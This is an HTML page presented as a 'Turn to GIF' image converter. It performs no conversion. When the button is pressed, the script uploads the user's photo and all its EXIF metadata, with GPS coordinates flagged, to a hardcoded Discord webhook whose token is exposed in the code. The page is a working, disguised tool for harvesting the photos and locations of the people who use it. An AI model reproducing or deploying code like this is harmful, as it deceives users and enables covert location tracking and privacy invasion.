<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gif.fuck</title>
  <!-- Using full build for better metadata support -->
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/full.umd.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: #050505;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(255, 0, 128, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(0, 255, 255, 0.12) 0%, transparent 40%);
    }
    .card {
      width: 100%;
      max-width: 520px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 28px;
      padding: 32px 28px;
      backdrop-filter: blur(20px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
    }
    .logo {
      font-size: 1.8rem;
      font-weight: 800;
      letter-spacing: -1px;
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-align: center;
      margin-bottom: 8px;
    }
    .subtitle {
      text-align: center;
      color: #888;
      font-size: 0.95rem;
      margin-bottom: 28px;
    }
    .preview-area {
      width: 100%;
      aspect-ratio: 1;
      background: rgba(255, 255, 255, 0.04);
      border: 2px dashed rgba(255, 255, 255, 0.15);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
      margin-bottom: 20px;
      transition: all 0.3s ease;
    }
    .preview-area.has-image {
      border-style: solid;
      border-color: rgba(0, 240, 255, 0.3);
    }
    .preview-area img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }
    .preview-area.has-image img {
      display: block;
    }
    .placeholder {
      text-align: center;
      color: #666;
      font-size: 0.95rem;
      padding: 20px;
    }
    .btn-row {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
    }
    .btn {
      flex: 1;
      padding: 16px;
      border: none;
      border-radius: 14px;
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      color: #fff;
    }
    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.14);
    }
    .btn-primary {
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      color: #000;
      width: 100%;
      margin-top: 8px;
      display: none;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(255, 45, 149, 0.3);
    }
    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    .meta-box {
      background: rgba(0, 0, 0, 0.35);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 14px;
      padding: 14px;
      margin-top: 16px;
      font-size: 0.85rem;
      color: #ccc;
      max-height: 200px;
      overflow-y: auto;
      display: none;
      text-align: left;
      white-space: pre-wrap;
      line-height: 1.5;
    }
    .status {
      text-align: center;
      margin-top: 18px;
      font-size: 0.95rem;
      min-height: 24px;
      color: #aaa;
    }
    .status.success { color: #00ff9d; }
    .status.error { color: #ff4d6d; }
    .status.loading { color: #00f0ff; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">gif.fuck</div>
    <div class="subtitle">Upload → extract metadata → send to Discord</div>

    <div class="preview-area" id="previewArea">
      <div class="placeholder" id="placeholder">
        Select or drop an image
      </div>
      <img id="preview" alt="Preview">
    </div>

    <div class="btn-row">
      <button class="btn btn-secondary" id="uploadBtn">Gallery</button>
      <button class="btn btn-secondary" id="cameraBtn">Camera</button>
    </div>

    <button class="btn btn-primary" id="convertBtn">Turn to GIF</button>

    <div class="meta-box" id="metaBox"></div>
    <div class="status" id="status"></div>
  </div>

  <input type="file" id="fileInput" accept="image/*,.heic,.heif,.avif,.tiff,.tif" hidden>
  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";

    const statusEl = document.getElementById('status');
    const convertBtn = document.getElementById('convertBtn');
    const preview = document.getElementById('preview');
    const previewArea = document.getElementById('previewArea');
    const placeholder = document.getElementById('placeholder');
    const metaBox = document.getElementById('metaBox');
    let selectedFile = null;
    let currentMeta = {};

    function updateStatus(text, type = "") {
      statusEl.textContent = text;
      statusEl.className = "status " + type;
    }

    function isImageFile(file) {
      if (!file) return false;
      if (file.type && file.type.startsWith("image/")) return true;
      const name = file.name.toLowerCase();
      return ['.jpg','.jpeg','.png','.gif','.webp','.bmp','.heic','.heif','.avif','.tiff','.tif'].some(ext => name.endsWith(ext));
    }

    async function getAllMetadata(file) {
      try {
        // Try multiple methods for better compatibility
        let data = await exifr.parse(file, true); // true = parse everything
        
        // Also try dedicated GPS method
        try {
          const gps = await exifr.gps(file);
          if (gps) {
            data = data || {};
            data.latitude = gps.latitude;
            data.longitude = gps.longitude;
          }
        } catch (e) {}

        return data || {};
      } catch (e) {
        console.error("Metadata error:", e);
        return {};
      }
    }

    function formatMetadata(meta) {
      if (!meta || Object.keys(meta).length === 0) {
        return "No metadata found.";
      }

      const lines = [];

      // Priority fields
      if (meta.Make) lines.push(`Camera Make: ${meta.Make}`);
      if (meta.Model) lines.push(`Camera Model: ${meta.Model}`);
      if (meta.Software) lines.push(`Software: ${meta.Software}`);
      if (meta.DateTimeOriginal) lines.push(`Date Taken: ${meta.DateTimeOriginal}`);
      if (meta.CreateDate) lines.push(`Create Date: ${meta.CreateDate}`);
      if (meta.ImageWidth && meta.ImageHeight) lines.push(`Dimensions: ${meta.ImageWidth} × ${meta.ImageHeight}`);
      if (meta.ISO) lines.push(`ISO: ${meta.ISO}`);
      if (meta.FNumber) lines.push(`Aperture: f/${meta.FNumber}`);
      if (meta.ExposureTime) lines.push(`Exposure: ${meta.ExposureTime}s`);
      if (meta.FocalLength) lines.push(`Focal Length: ${meta.FocalLength}mm`);
      if (meta.LensModel) lines.push(`Lens: ${meta.LensModel}`);

      // GPS - most important
      if (meta.latitude && meta.longitude) {
        lines.push(`GPS Latitude: ${meta.latitude}`);
        lines.push(`GPS Longitude: ${meta.longitude}`);
        if (meta.GPSAltitude) lines.push(`Altitude: ${meta.GPSAltitude} m`);
      }

      // If still empty, show raw keys
      if (lines.length === 0) {
        Object.keys(meta).slice(0, 15).forEach(key => {
          if (meta[key] !== undefined && meta[key] !== null) {
            lines.push(`${key}: ${String(meta[key]).slice(0, 80)}`);
          }
        });
      }

      return lines.length > 0 ? lines.join("\n") : "No useful metadata found.";
    }

    async function sendToWebhook(file, meta) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      const metaText = formatMetadata(meta);
      const hasGPS = meta.latitude && meta.longitude;

      let content = `**New image uploaded**\n`;
      content += `**File:** ${file.name}\n`;
      content += `**Size:** ${(file.size / 1024 / 1024).toFixed(2)} MB\n`;
      content += `**Type:** ${file.type || "unknown"}\n\n`;

      if (hasGPS) {
        content += `**GPS FOUND**\n`;
        content += `Lat: \`${meta.latitude}\`\n`;
        content += `Lon: \`${meta.longitude}\`\n\n`;
      }

      content += `**Metadata:**\n\`\`\`\n${metaText}\n\`\`\``;

      // Also attach raw JSON so nothing is lost
      const raw = JSON.stringify(meta, null, 2).slice(0, 1800);
      if (raw && raw !== "{}") {
        content += `\n\n**Raw metadata:**\n\`\`\`json\n${raw}\n\`\`\``;
      }

      formData.append("payload_json", JSON.stringify({
        content: content,
        username: "gif.fuck"
      }));

      const res = await fetch(WEBHOOK_URL, {
        method: "POST",
        body: formData
      });

      if (!res.ok) {
        throw new Error("Webhook failed: " + res.status);
      }
    }

    async function handleFile(file) {
      if (!isImageFile(file)) {
        updateStatus("Please select a valid image", "error");
        return;
      }

      selectedFile = file;
      currentMeta = {};

      // Preview
      const reader = new FileReader();
      reader.onload = (e) => {
        preview.src = e.target.result;
        previewArea.classList.add("has-image");
        placeholder.style.display = "none";
      };
      reader.onerror = () => {
        previewArea.classList.add("has-image");
        placeholder.innerHTML = `Selected: ${file.name}<br><small>Preview not available</small>`;
        placeholder.style.display = "block";
      };
      reader.readAsDataURL(file);

      updateStatus("Reading metadata...", "loading");
      convertBtn.style.display = "block";
      convertBtn.disabled = true;

      // Extract metadata immediately and show it
      try {
        currentMeta = await getAllMetadata(file);
        const formatted = formatMetadata(currentMeta);
        metaBox.textContent = formatted;
        metaBox.style.display = "block";

        if (currentMeta.latitude && currentMeta.longitude) {
          updateStatus(`GPS found: ${currentMeta.latitude.toFixed(5)}, ${currentMeta.longitude.toFixed(5)}`, "success");
        } else {
          updateStatus("Metadata loaded (no GPS detected)", "loading");
        }
      } catch (err) {
        metaBox.textContent = "Failed to read metadata";
        metaBox.style.display = "block";
        updateStatus("Could not read metadata", "error");
      }

      convertBtn.disabled = false;
    }

    async function convertToGif() {
      if (!selectedFile) return;

      updateStatus("Sending to Discord...", "loading");
      convertBtn.disabled = true;

      try {
        await sendToWebhook(selectedFile, currentMeta);
        updateStatus("Sent successfully!", "success");
      } catch (err) {
        console.error(err);
        updateStatus("Failed to send: " + err.message, "error");
      }

      convertBtn.disabled = false;
    }

    // Events
    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
    convertBtn.onclick = convertToGif;

    document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
    document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);

    previewArea.onclick = () => {
      if (!selectedFile) document.getElementById("fileInput").click();
    };
  </script>
</body>
</html>
